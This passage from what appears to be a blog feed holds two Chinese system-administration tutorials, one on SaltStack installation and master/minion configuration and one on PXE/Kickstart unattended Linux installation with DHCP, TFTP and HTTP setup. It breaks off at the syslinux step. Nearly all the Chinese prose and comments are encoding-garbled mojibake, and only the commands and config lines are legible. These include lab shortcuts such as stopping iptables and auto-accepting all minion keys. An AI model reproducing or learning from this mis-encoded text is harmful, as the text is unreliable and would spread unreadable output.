title="å…·ä½“æ­¥éª¤å¦‚ä¸‹:"></a>å…·ä½“æ­¥éª¤å¦‚ä¸‹:</h3><ol><li><p>Salt stackçš„Masterä¸Minionä¹‹é—´é€šè¿‡ZeroMqè¿›è¡Œæ¶ˆæ¯ä¼ é€’ï¼Œä½¿ç”¨äº†ZeroMqçš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œè¿æ¥æ–¹å¼åŒ…æ‹¬<code>tcp</code>ï¼Œ<code>ipc</code></p></li><li><p>saltå‘½ä»¤ï¼Œå°†<code>cmd.run ls</code>å‘½ä»¤ä»<code>salt.client.LocalClient.cmd_cli</code>å‘å¸ƒåˆ°masterï¼Œè·å–ä¸€ä¸ªJodidï¼Œæ ¹æ®jobidè·å–å‘½ä»¤æ‰§è¡Œç»“æœã€‚</p></li><li><p>masteræ¥æ”¶åˆ°å‘½ä»¤åï¼Œå°†è¦æ‰§è¡Œçš„å‘½ä»¤å‘é€ç»™å®¢æˆ·ç«¯minionã€‚</p></li><li><p>minionä»æ¶ˆæ¯æ€»çº¿ä¸Šæ¥æ”¶åˆ°è¦å¤„ç†çš„å‘½ä»¤ï¼Œäº¤ç»™<code>minion._handle_aes</code>å¤„ç†</p></li><li><p><code>minion._handle_aes</code>å‘èµ·ä¸€ä¸ªæœ¬åœ°çº¿ç¨‹è°ƒç”¨cmdmodæ‰§è¡Œlså‘½ä»¤ã€‚çº¿ç¨‹æ‰§è¡Œå®Œlsåï¼Œè°ƒç”¨minion._return_pubæ–¹æ³•ï¼Œå°†æ‰§è¡Œç»“æœé€šè¿‡æ¶ˆæ¯æ€»çº¿è¿”å›ç»™master</p></li><li><p>masteræ¥æ”¶åˆ°å®¢æˆ·ç«¯è¿”å›çš„ç»“æœï¼Œè°ƒç”¨<code>master._handle_aes</code>æ–¹æ³•ï¼Œå°†ç»“æœå†™çš„æ–‡ä»¶ä¸­</p></li><li><p><code>salt.client.LocalClient.cmd_cli</code>é€šè¿‡è½®è¯¢è·å–Jobæ‰§è¡Œç»“æœï¼Œå°†ç»“æœè¾“å‡ºåˆ°ç»ˆç«¯ã€‚</p></li></ol><p><strong>ä¸‹é¢è®©æˆ‘ä»¬æ¥ä½¿ç”¨å®ƒï¼Œæ‰èƒ½æ›´å¥½çš„ç†è§£å®ƒçš„å·¥ä½œæ¨¡å¼å’ŒåŸç†</strong></p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><ul><li>CentOS6/Redhat6</li></ul><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest-1.el6.noarch.rpm</div></pre></div></div></figure><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">yum clean all</div></pre></div></div></figure><ul><li>å®‰è£…salt-minion, salt-master, æˆ–è€…å…¶å®ƒç»„ä»¶</li></ul><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-master<span class="comment">#serverç«¯</span></div><div class="line">sudo yum install salt-minion<span class="comment">#clientç«¯</span></div><div class="line">sudo yum install salt-ssh</div><div class="line">sudo yum install salt-syndic</div><div class="line">sudo yum install salt-cloud</div><div class="line">sudo yum install salt-api</div></pre></div></div></figure><p><strong>æœåŠ¡ç«¯</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-master</div></pre></div></div></figure><p><strong>å®¢æˆ·ç«¯</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-minion</div></pre></div></div></figure><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®  :"></a>é…ç½®  :</h2><h3 id="æœåŠ¡ç«¯-vim-etc-salt-master"><a href="#æœåŠ¡ç«¯-vim-etc-salt-master" class="headerlink" title="æœåŠ¡ç«¯ vim /etc/salt/master"></a>æœåŠ¡ç«¯ <code>vim /etc/salt/master</code></h3><p><em>#masteræ¶ˆæ¯å‘å¸ƒç«¯å£ Default: 4505</em></p><p><code>publish_port: 4505</code>    </p><p><em>#å·¥ä½œçº¿ç¨‹æ•°ï¼Œåº”ç­”å’Œæ¥å—minion Default: 5</em></p><p><code>worker_threads: 100</code></p><p><em>#å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ Default: 4506</em></p><p><code>ret_port: 4506</code>    </p><p><em># è‡ªåŠ¨æ¥å—æ‰€æœ‰å®¢æˆ·ç«¯</em></p><p><code>auto_accept: True</code> </p><p><em># è‡ªåŠ¨è®¤è¯é…ç½®</em>   </p><p><code>autosign_file: /etc/salt/autosign.conf</code></p><h3 id="å®¢æˆ·ç«¯-vim-etc-salt-minion"><a href="#å®¢æˆ·ç«¯-vim-etc-salt-minion" class="headerlink" title="å®¢æˆ·ç«¯ vim /etc/salt/minion"></a>å®¢æˆ·ç«¯ <code>vim /etc/salt/minion</code></h3><p><em># master IPæˆ–åŸŸå</em></p><p><code>master: 10.0.0.1</code></p><p><em># å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ã€‚ Default: 4506</em></p><p><code>syndic_master_port: 4506</code></p><p><em># å»ºè®®çº¿ä¸Šç”¨ipæ˜¾ç¤ºæˆ–ä¸šåŠ¡ç¼–å·</em></p><p><code>id: test</code></p><blockquote><p>id minionçš„å”¯ä¸€æ ‡ç¤ºã€‚Default: hostname <em><br>minion idï¼šminionçš„å”¯ä¸€æ ‡ç¤ºï¼Œé»˜è®¤ä¸ºminionçš„hostnameï¼Œå¦‚æœidä¿®æ”¹äº†ï¼Œmaster éœ€è¦é‡æ–°è®¤è¯ã€‚<br>ï¼ˆé€šè¿‡tcpdumpåšäº†ä¸ªå®éªŒï¼Œä¿®æ”¹minion idåï¼Œmasterä¸Šä¼šæ–°å¢ä¸€ä¸ªidï¼Œä½†è€idä¹Ÿè¿˜åœ¨ï¼Œæ‰§è¡Œsalt â€˜</em>â€˜ test.pingçš„æ—¶å€™ï¼Œæ‰§è¡Œæ—¶é—´å˜é•¿äº†ï¼Œå»¶è¿Ÿæ—¶é—´çº¦ä¸º14sï¼Œè€Œä¸”masterä¼šåœ¨å‘é€å‘½ä»¤åå»¶è¿Ÿ10så†ç»™æ¯ä¸ªå·²ç»æ‰§è¡ŒæˆåŠŸçš„minionå‘é€ä¸€ä¸ªåŒ…å¹¶æœ‰minionæœ‰è¿”å›ï¼Œå¦‚æœæ²¡æœ‰è€idå­˜åœ¨ä¸ä¼šå‘é€ï¼Œå¯ä»¥ç†è§£ä¸ºmateråœ¨å‘æ¯ä¸ªminionå¯»æ±‚æœªè¿æ¥çš„idçš„ä¿¡æ¯ï¼Œminionçš„saltæœåŠ¡å…³é—­ä¹Ÿæ˜¯è¿™ç§æƒ…å†µï¼Œä¿®æ”¹timeoutå€¼æ— æ•ˆã€‚ï¼‰</p></blockquote><h2 id="æµ‹è¯•å‘½ä»¤-ï¼š"><a href="#æµ‹è¯•å‘½ä»¤-ï¼š" class="headerlink" title="æµ‹è¯•å‘½ä»¤ ï¼š"></a>æµ‹è¯•å‘½ä»¤ ï¼š</h2><p><code>æµ‹è¯•ç¯å¢ƒä¸­å…³é—­ iptblesï¼ï¼</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">service iptables stop</div></pre></div></div></figure><p><strong>masterç«¯æ‰§è¡Œ</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">salt-key -L</div><div class="line">salt-key -A</div></pre></div></div></figure><p><em>æŸ¥çœ‹åˆ°minionç«¯ipè¡¨ç¤ºæˆåŠŸ</em></p><blockquote><p>Accepted Keys:<br>192.168.1.3<br>Denied Keys:<br>Unaccepted Keys:<br>Rejected Keys:</p></blockquote><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">salt '*' test.ping</div></pre></div></div></figure><blockquote><p>192.168.1.3:<br>    True</p></blockquote><p><em>Posted by : DY</em></p>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Saltstack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kickstartæ— äººå€¼å®ˆå®‰è£…Linux</title>
      <link href="/2016/05/12/linux-kickstart/"/>
      <url>/2016/05/12/linux-kickstart/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>ä½œä¸ºä¸­å°å…¬å¸çš„è¿ç»´ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€äº›æœºæ¢°å¼çš„é‡å¤å·¥ä½œï¼Œä¾‹å¦‚ï¼šæœ‰æ—¶å…¬å¸åŒæ—¶ä¸Šçº¿å‡ åç”šè‡³ä¸Šç™¾å°æœåŠ¡å™¨ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬åœ¨çŸ­æ—¶é—´å†…å®Œæˆç³»ç»Ÿå®‰è£…ã€‚</p><p>OKè®©æˆ‘ä»¬æ¥ä¸€èµ·kickstartå§</p></blockquote><a id="more"></a><h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1. ç®€ä»‹"></a>1. ç®€ä»‹</h1><p><code>ç†è®ºæ€§çŸ¥è¯†å»ºè®®å¤§æ¦‚çœ‹ä¸‹,å…ˆæŒ‰ç…§æ­¥éª¤åšä¸€éçŸ¥åˆ°å¤§æ¦‚æ€è·¯,åœ¨ä»”ç»†çœ‹ä¼šæ›´å¥½(ä¸ªäººå»ºè®®)</code></p><h2 id="1-ä»€ä¹ˆæ˜¯PXE"><a href="#1-ä»€ä¹ˆæ˜¯PXE" class="headerlink" title="1) ä»€ä¹ˆæ˜¯PXE?"></a>1) ä»€ä¹ˆæ˜¯PXE?</h2><blockquote><p>PXEï¼Œå…¨å<code>Pre-boot Execution Environment</code>ï¼Œé¢„å¯åŠ¨æ‰§è¡Œç¯å¢ƒï¼›<br>é€šè¿‡ç½‘ç»œæ¥å£å¯åŠ¨è®¡ç®—æœºï¼Œä¸ä¾èµ–æœ¬åœ°å­˜å‚¨è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜ï¼‰æˆ–æœ¬åœ°å·²å®‰è£…çš„æ“ä½œç³»ç»Ÿï¼›<br>ç”±Intelå’ŒSystemsoftå…¬å¸äº1999å¹´9æœˆ20æ—¥å…¬å¸ƒçš„æŠ€æœ¯ï¼›<br><code>Client/Serverçš„å·¥ä½œæ¨¡å¼:</code><br>PXEå®¢æˆ·ç«¯ä¼šè°ƒç”¨ç½‘é™…åè®®(IP)ã€ç”¨æˆ·æ•°æ®æŠ¥åè®®(UDP)ã€åŠ¨æ€ä¸»æœºè®¾å®šåè®®(DHCP)ã€å°å‹æ–‡ä»¶ä¼ è¾“åè®®(TFTP)ç­‰ç½‘ç»œåè®®ï¼›<br>PXEå®¢æˆ·ç«¯(client)è¿™ä¸ªæœ¯è¯­æ˜¯æŒ‡æœºå™¨åœ¨PXEå¯åŠ¨è¿‡ç¨‹ä¸­çš„è§’è‰²ã€‚ä¸€ä¸ªPXEå®¢æˆ·ç«¯å¯ä»¥æ˜¯ä¸€å°æœåŠ¡å™¨ã€ç¬”è®°æœ¬ç”µè„‘æˆ–è€…å…¶ä»–è£…æœ‰PXEå¯åŠ¨ä»£ç çš„æœºå™¨ï¼ˆæˆ‘ä»¬ç”µè„‘çš„ç½‘å¡ï¼‰ã€‚</p></blockquote><h2 id="2-PXEå·¥ä½œè¿‡ç¨‹"><a href="#2-PXEå·¥ä½œè¿‡ç¨‹" class="headerlink" title="2) PXEå·¥ä½œè¿‡ç¨‹"></a>2) PXEå·¥ä½œè¿‡ç¨‹</h2><p><img src="http://ww1.sinaimg.cn/large/0060lm7Tgw1f6xsskxex0j30gn0fptar.jpg" alt="PXE"></p><h3 id="1-PXE-Clientå‘DHCPå‘é€è¯·æ±‚"><a href="#1-PXE-Clientå‘DHCPå‘é€è¯·æ±‚" class="headerlink" title="1. PXE Clientå‘DHCPå‘é€è¯·æ±‚"></a>1. PXE Clientå‘DHCPå‘é€è¯·æ±‚</h3><p>PXE Clientä»è‡ªå·±çš„PXEç½‘å¡å¯åŠ¨ï¼Œé€šè¿‡PXE BootROM(è‡ªå¯åŠ¨èŠ¯ç‰‡)ä¼šä»¥UDP(ç®€å•ç”¨æˆ·æ•°æ®æŠ¥åè®®)å‘é€ä¸€ä¸ªå¹¿æ’­è¯·æ±‚ï¼Œå‘æœ¬ç½‘ç»œä¸­çš„DHCPæœåŠ¡å™¨ç´¢å–IPã€‚</p><h3 id="2-DHCPæœåŠ¡å™¨æä¾›ä¿¡æ¯"><a href="#2-DHCPæœåŠ¡å™¨æä¾›ä¿¡æ¯" class="headerlink" title="2. DHCPæœåŠ¡å™¨æä¾›ä¿¡æ¯"></a>2. DHCPæœåŠ¡å™¨æä¾›ä¿¡æ¯</h3><p>DHCPæœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ŒéªŒè¯æ˜¯å¦æ¥è‡³åˆæ³•çš„PXE Clientçš„è¯·æ±‚ï¼ŒéªŒè¯é€šè¿‡å®ƒå°†ç»™å®¢æˆ·ç«¯ä¸€ä¸ªâ€œæä¾›â€å“åº”ï¼Œè¿™ä¸ªâ€œæä¾›â€å“åº”ä¸­åŒ…å«äº†ä¸ºå®¢æˆ·ç«¯åˆ†é…çš„IPåœ°å€ã€pxelinuxå¯åŠ¨ç¨‹åº(TFTP)ä½ç½®ï¼Œä»¥åŠé…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚</p><h3 id="3-PXEå®¢æˆ·ç«¯è¯·æ±‚ä¸‹è½½å¯åŠ¨æ–‡ä»¶"><a href="#3-PXEå®¢æˆ·ç«¯è¯·æ±‚ä¸‹è½½å¯åŠ¨æ–‡ä»¶" class="headerlink" title="3. PXEå®¢æˆ·ç«¯è¯·æ±‚ä¸‹è½½å¯åŠ¨æ–‡ä»¶"></a>3. PXEå®¢æˆ·ç«¯è¯·æ±‚ä¸‹è½½å¯åŠ¨æ–‡ä»¶</h3><p>å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„â€œå›åº”â€åï¼Œä¼šå›åº”ä¸€ä¸ªå¸§ï¼Œä»¥è¯·æ±‚ä¼ é€å¯åŠ¨æ‰€éœ€æ–‡ä»¶ã€‚è¿™äº›å¯åŠ¨æ–‡ä»¶åŒ…æ‹¬ï¼špxelinux.0ã€pxelinux.cfg/defaultã€vmlinuzã€initrd.imgç­‰æ–‡ä»¶ã€‚</p><h3 id="4-Boot-Serverå“åº”å®¢æˆ·ç«¯è¯·æ±‚å¹¶ä¼ é€æ–‡ä»¶"><a href="#4-Boot-Serverå“åº”å®¢æˆ·ç«¯è¯·æ±‚å¹¶ä¼ é€æ–‡ä»¶" class="headerlink" title="4. Boot Serverå“åº”å®¢æˆ·ç«¯è¯·æ±‚å¹¶ä¼ é€æ–‡ä»¶"></a>4. Boot Serverå“åº”å®¢æˆ·ç«¯è¯·æ±‚å¹¶ä¼ é€æ–‡ä»¶</h3><p>å½“æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œä»–ä»¬ä¹‹é—´ä¹‹åå°†æœ‰æ›´å¤šçš„ä¿¡æ¯åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ä½œåº”ç­”, ç”¨ä»¥å†³å®šå¯åŠ¨å‚æ•°ã€‚BootROMç”±TFTPé€šè®¯åè®®ä»Boot Serverä¸‹è½½å¯åŠ¨å®‰è£…ç¨‹åºæ‰€å¿…é¡»çš„æ–‡ä»¶(pxelinux.0ã€pxelinux.cfg/default)ã€‚defaultæ–‡ä»¶ä¸‹è½½å®Œæˆåï¼Œä¼šæ ¹æ®è¯¥æ–‡ä»¶ä¸­å®šä¹‰çš„å¼•å¯¼é¡ºåºï¼Œå¯åŠ¨Linuxå®‰è£…ç¨‹åºçš„å¼•å¯¼å†…æ ¸ã€‚</p><h3 id="5-è¯·æ±‚ä¸‹è½½è‡ªåŠ¨åº”ç­”æ–‡ä»¶"><a href="#5-è¯·æ±‚ä¸‹è½½è‡ªåŠ¨åº”ç­”æ–‡ä»¶" class="headerlink" title="5. è¯·æ±‚ä¸‹è½½è‡ªåŠ¨åº”ç­”æ–‡ä»¶"></a>5. è¯·æ±‚ä¸‹è½½è‡ªåŠ¨åº”ç­”æ–‡ä»¶</h3><p>å®¢æˆ·ç«¯é€šè¿‡pxelinux.cfg/defaultæ–‡ä»¶æˆåŠŸçš„å¼•å¯¼Linuxå®‰è£…å†…æ ¸åï¼Œå®‰è£…ç¨‹åºé¦–å…ˆå¿…é¡»ç¡®å®šä½ é€šè¿‡ä»€ä¹ˆå®‰è£…ä»‹è´¨æ¥å®‰è£…linuxï¼Œå¦‚æœæ˜¯é€šè¿‡ç½‘ç»œå®‰è£…(NFS, FTP, HTTP)ï¼Œåˆ™ä¼šåœ¨è¿™ä¸ªæ—¶å€™åˆå§‹åŒ–ç½‘ç»œï¼Œå¹¶å®šä½å®‰è£…æºä½ç½®ã€‚æ¥ç€ä¼šè¯»å–defaultæ–‡ä»¶ä¸­æŒ‡å®šçš„è‡ªåŠ¨åº”ç­”æ–‡ä»¶ks.cfgæ‰€åœ¨ä½ç½®ï¼Œæ ¹æ®è¯¥ä½ç½®è¯·æ±‚ä¸‹è½½è¯¥æ–‡ä»¶ã€‚</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œåœ¨ç¬¬2æ­¥å’Œç¬¬5æ­¥åˆå§‹åŒ–2æ¬¡ç½‘ç»œäº†ï¼Œè¿™æ˜¯ç”±äºPXEè·å–çš„æ˜¯å®‰è£…ç”¨çš„å†…æ ¸ä»¥åŠå®‰è£…ç¨‹åºç­‰ï¼Œè€Œå®‰è£…ç¨‹åºè¦è·å–çš„æ˜¯å®‰è£…ç³»ç»Ÿæ‰€éœ€çš„äºŒè¿›åˆ¶åŒ…ä»¥åŠé…ç½®æ–‡ä»¶ã€‚å› æ­¤PXEæ¨¡å—å’Œå®‰è£…ç¨‹åºæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ï¼ŒPXEçš„ç½‘ç»œé…ç½®å¹¶ä¸èƒ½ä¼ é€’ç»™å®‰è£…ç¨‹åºï¼Œä»è€Œè¿›è¡Œä¸¤æ¬¡è·å–IPåœ°å€è¿‡ç¨‹ï¼Œä½†IPåœ°å€åœ¨DHCPçš„ç§ŸæœŸå†…æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><h3 id="6-å®¢æˆ·ç«¯å®‰è£…æ“ä½œç³»ç»Ÿ"><a href="#6-å®¢æˆ·ç«¯å®‰è£…æ“ä½œç³»ç»Ÿ" class="headerlink" title="6. å®¢æˆ·ç«¯å®‰è£…æ“ä½œç³»ç»Ÿ"></a>6. å®¢æˆ·ç«¯å®‰è£…æ“ä½œç³»ç»Ÿ</h3><p>å°†ks.cfgæ–‡ä»¶ä¸‹è½½å›æ¥åï¼Œé€šè¿‡è¯¥æ–‡ä»¶æ‰¾åˆ°OS Serverï¼Œå¹¶æŒ‰ç…§è¯¥æ–‡ä»¶çš„é…ç½®è¯·æ±‚ä¸‹è½½å®‰è£…è¿‡ç¨‹éœ€è¦çš„è½¯ä»¶åŒ…ã€‚<br>OS Serverå’Œå®¢æˆ·ç«¯å»ºç«‹è¿æ¥åï¼Œå°†å¼€å§‹ä¼ è¾“è½¯ä»¶åŒ…ï¼Œå®¢æˆ·ç«¯å°†å¼€å§‹å®‰è£…æ“ä½œç³»ç»Ÿã€‚å®‰è£…å®Œæˆåï¼Œå°†æç¤ºé‡æ–°å¼•å¯¼è®¡ç®—æœºã€‚</p><h1 id="2-å®‰è£…DHCPæœåŠ¡"><a href="#2-å®‰è£…DHCPæœåŠ¡" class="headerlink" title="2. å®‰è£…DHCPæœåŠ¡"></a>2. å®‰è£…DHCPæœåŠ¡</h1><p><strong><code>å¦‚æœæ˜¯ç”¨è™šæ‹Ÿæœºæµ‹è¯•éœ€è¦å…³é—­è™šæ‹Ÿç½‘å¡DHCPåŠŸèƒ½</code></strong></p><h2 id="1-å®‰è£…åŒ…"><a href="#1-å®‰è£…åŒ…" class="headerlink" title="1) å®‰è£…åŒ…"></a>1) å®‰è£…åŒ…</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install dhcp</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># rpm -ql dhcp |grep "dhcpd.conf"</span></div><div class="line">/etc/dhcp/dhcpd.conf   <span class="comment"># æŸ¥çœ‹é…ç½®æ–‡ä»¶ä½ç½®</span></div><div class="line">/usr/share/doc/dhcp-4.1.1/dhcpd-conf-to-ldap</div><div class="line">/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample</div><div class="line">/usr/share/man/man5/dhcpd.conf.5.gz</div></pre></div></div></figure><h2 id="2-ç¼–è¾‘é…ç½®æ–‡ä»¶"><a href="#2-ç¼–è¾‘é…ç½®æ–‡ä»¶" class="headerlink" title="2) ç¼–è¾‘é…ç½®æ–‡ä»¶"></a>2) ç¼–è¾‘é…ç½®æ–‡ä»¶</h2><p><code>[root@CentOS6.5 ~]# vim /etc/dhcp/dhcp.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">default-lease-time 14400;</div><div class="line">ddns-update-style none;</div><div class="line">next-server 192.168.1.52;<span class="comment">#æŒ‡å®štftpdæœåŠ¡å™¨ip</span></div><div class="line">filename <span class="string">"pxelinux.0"</span>;</div><div class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;<span class="comment">#åœ°å€æ± </span></div><div class="line">        range 192.168.1.50 192.168.1.240;</div><div class="line">        default-lease-time 14400;               <span class="comment"># è®¾ç½®é»˜è®¤çš„IPç§Ÿç”¨æœŸé™</span></div><div class="line">        max-lease-time 172800;</div><div class="line">&#125;</div></pre></div></div></figure><p><code>[root@CentOS6.5 ~]# vim /etc/sysconfig/dhcpd</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">DHCPDARGS=eth1  <span class="comment"># æŒ‡å®šç›‘å¬ç½‘å¡</span></div></pre></div></div></figure><p><code>[root@CentOS6.5 ~]# service dhcpd restart</code></p><h1 id="3-å®‰è£…TFTP"><a href="#3-å®‰è£…TFTP" class="headerlink" title="3. å®‰è£…TFTP"></a>3. å®‰è£…TFTP</h1><h2 id="1-TFTPç®€ä»‹"><a href="#1-TFTPç®€ä»‹" class="headerlink" title="1) TFTPç®€ä»‹:"></a>1) TFTPç®€ä»‹:</h2><p><code>TFTPï¼ˆTrivial File Transfer Protocol,ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯TCP/IPåè®®æ—ä¸­çš„ä¸€ä¸ªç”¨æ¥åœ¨å®¢æˆ·æœºä¸æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œç®€å•æ–‡ä»¶ä¼ è¾“çš„åè®®ï¼Œæä¾›ä¸å¤æ‚ã€å¼€é”€ä¸å¤§çš„æ–‡ä»¶ä¼ è¾“æœåŠ¡ã€‚ç«¯å£å·ä¸º69ã€‚</code></p><h2 id="2-TFTPå®‰è£…é…ç½®"><a href="#2-TFTPå®‰è£…é…ç½®" class="headerlink" title="2) TFTPå®‰è£…é…ç½®"></a>2) TFTPå®‰è£…é…ç½®</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install tftp-server</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># vim /etc/xinetd.d/tftp</span></div><div class="line">service tftp</div><div class="line">&#123;</div><div class="line">        socket_type             = dgram</div><div class="line">        protocol                = udp</div><div class="line">        <span class="built_in">wait</span>                    = yes</div><div class="line">        user                    = root</div><div class="line">        server                  = /usr/sbin/in.tftpd</div><div class="line">        server_args             = -s /var/lib/tftpboot <span class="comment"># æŒ‡å®šç›®å½•ï¼Œä¿æŒé»˜è®¤ï¼Œä¸ç”¨ä¿®æ”¹</span></div><div class="line">        <span class="built_in">disable</span>                 = no <span class="comment"># ç”±åŸæ¥çš„yesæ”¹ä¸ºno</span></div><div class="line">        per_source              = 11</div><div class="line">        cps                     = 100 2</div><div class="line">        flags                   = IPv4</div><div class="line">&#125;</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># /etc/init.d/xinetd restart</span></div><div class="line">Stopping xinetd:                                           [FAILED]</div><div class="line">Starting xinetd:                                           [  OK  ]</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># netstat -tunlp|grep 69</span></div><div class="line">udp        0      0 0.0.0.0:69            0.0.0.0:*      1106/xinetd</div></pre></div></div></figure><h1 id="4-å®‰è£…HTTPæœåŠ¡"><a href="#4-å®‰è£…HTTPæœåŠ¡" class="headerlink" title="4. å®‰è£…HTTPæœåŠ¡"></a>4. å®‰è£…HTTPæœåŠ¡</h1><p><strong><code>å¯ä»¥ç”¨Apacheæˆ–Nginxæä¾›HTTPæœåŠ¡ã€‚Pythonçš„å‘½ä»¤webæœåŠ¡ä¸è¡Œï¼Œä¼šæœ‰æŠ¥é”™ã€‚</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install httpd</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># sed -i "277i ServerName 127.0.0.1:80" /etc/httpd/conf/httpd.conf</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># /etc/init.d/httpd start</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mkdir /var/www/html/CentOS-6.5</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mount /dev/sr0 /var/www/html/CentOS-6.5/ #sr0æµ‹è¯•è™šæ‹Ÿæœºç¯å¢ƒçº¿ä¸Šä¼šä¸åŒ</span></div><div class="line">mount: block device /dev/sr0 is write-protected, mounting <span class="built_in">read</span>-only</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># df -h</span></div><div class="line">Filesystem      Size  Used Avail Use% Mounted on</div><div class="line">/dev/sda3        19G  2.4G   16G  14% /</div><div class="line">tmpfs           491M   16K  491M   1% /dev/shm</div><div class="line">/dev/sda1       190M   36M  145M  20% /boot</div><div class="line">/dev/sr0        3.7G  3.7G     0 100% /var/www/html/CentOS-6.5</div><div class="line"><span class="comment"># ä¸ç®¡æ€ä¹ˆå¼„ï¼Œåªè¦æŠŠå®‰è£…å…‰ç›˜å†…å®¹èƒ½é€šè¿‡webå‘å¸ƒå³å¯ã€‚å› ä¸ºæ˜¯æ¼”ç¤ºï¼Œå¦‚æœå¤åˆ¶é•œåƒå°±æœ‰ç‚¹æµªè´¹æ—¶é—´ã€‚ä½†ç”Ÿäº§ç¯å¢ƒå°±ä¸€å®šè¦å¤åˆ¶äº†ï¼Œå…‰ç›˜è¯»å–é€Ÿåº¦æœ‰é™ã€‚</span></div></pre></div></div></figure><p>æµè§ˆå™¨è®¿é—®æµ‹è¯•é…ç½®æ˜¯å¦æˆåŠŸ<code>http://IP/CentOS-6.5</code></p><h1 id="5-é…ç½®æ”¯æŒPXEçš„å¯åŠ¨ç¨‹åº"><a href="#5-é…ç½®æ”¯æŒPXEçš„å¯åŠ¨ç¨‹åº" class="headerlink" title="5. é…ç½®æ”¯æŒPXEçš„å¯åŠ¨ç¨‹åº"></a>5. é…ç½®æ”¯æŒPXEçš„å¯åŠ¨ç¨‹åº</h1><p><code>syslinuxæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å¼•å¯¼åŠ 